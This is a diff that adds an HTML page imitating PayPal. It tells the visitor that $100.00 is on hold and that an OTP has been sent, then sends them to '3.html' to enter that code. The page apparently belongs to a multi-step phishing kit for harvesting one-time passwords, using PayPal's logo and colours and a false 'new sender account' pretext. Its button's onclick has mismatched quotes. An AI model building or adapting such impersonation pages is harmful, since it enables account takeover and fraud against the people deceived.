@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal - Pending $100</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&display=swap');
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f4f4f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .pending-container {
+            background-color: white;
+            padding: 40px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #001c6c;
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .amount {
+            font-size: 24px;
+            font-weight: 700;
+            color: #0070ba;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #777;
+            margin-top: 20px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #0070ba;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        button:hover {
+            background-color: #005ea6;
+        }
+    </style>
+</head>
+<body>
+    <div class="pending-container">
+        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo" class="logo">
+        <h2>Verification Required</h2>
+        
+        <p>An amount of <span class="amount">$100.00</span> has been put on hold.</p>
+        <p>We have sent a one-time password (OTP) to your email or phone.</p>
+        <p>Please enter the OTP on the next page to verify your account.</p>
+        
+        <div class="info-text">
+            <p><strong>Why is this on hold?</strong><br>  
+            The funds are on hold because the sender is using a recent PayPal account. This measure helps us ensure secure transactions.</p>
+        </div>
+        
+        <button onclick="window.location.href="3.html'">Enter OTP</button>
+    </div>
+</body>
+</html>
